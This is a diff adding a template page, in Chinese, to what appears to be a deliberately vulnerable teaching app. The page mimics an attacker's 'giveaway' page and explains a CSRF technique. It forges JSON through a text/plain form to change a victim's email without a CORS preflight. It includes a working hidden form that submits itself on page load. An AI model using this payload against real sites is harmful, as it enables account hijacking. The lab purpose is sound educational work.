@@ -1,0 +1,53 @@
+{% extends "vuln4all/base.html" %}
+{% block title %}整点福利 - {{ VULN.info.name }}{% endblock %}
+
+{% block content %}
+<h1>整点福利，先到先得</h1>
+<p>这是一张攻击者放的页面。它看起来在发福利，实际上页面一打开，
+它就用<strong>你的浏览器</strong>去提交了一个改邮箱的请求。</p>
+
+<h2>它是怎么发出的</h2>
+<p class="muted small">
+  改邮箱的接口只收 <code>application/json</code>。HTML 表单发不出这个类型 ——
+  但它能发 <code>text/plain</code>，而 <code>text/plain</code> 的表单编码
+  <strong>不对字段名做任何转义</strong>。于是把 JSON 的开头和结尾分别塞进
+  <code>name</code> 和 <code>value</code>，拼出来的整段 body 正好就是一段合法 JSON：
+</p>
+
+<pre class="payload">&lt;form action="{{ target }}" method="POST" enctype="text/plain"&gt;
+  &lt;input name='{{ field_name }}' value='"}'&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+
+实际发出的请求体：
+{"email":"{{ evil_email }}","ignore":"="}
+                      ↑ 表单的那个等号变成了 ignore 字段的值</pre>
+
+<p class="muted small">
+  服务端不看 Content-Type 就把请求体当 JSON 解析，所以它照单全收。
+</p>
+
+<form id="csrf-form" action="{{ target }}" method="POST" enctype="text/plain" style="display:none">
+  <input type="hidden" name='{{ field_name }}' value='"}'>
+</form>
+
+<p>
+  <strong>手动触发：</strong>
+  <button class="btn" onclick="document.getElementById('csrf-form').submit()">再来一次</button>
+</p>
+
+<script>
+  document.getElementById('csrf-form').submit();
+</script>
+
+<h2>接下来</h2>
+<ol>
+  <li>回到 <a href="{{ victim_url }}">个人中心</a>，看你的邮箱变成了什么</li>
+  <li>全程你都没点过「保存」</li>
+</ol>
+
+<p class="muted small">
+  注意：<code>text/plain</code> 是 CORS 允许的"简单类型"，所以浏览器
+  <strong>不会</strong>先发预检请求（OPTIONS）—— 这也是这个手法能成立的原因之一。
+</p>
+{% endblock %}
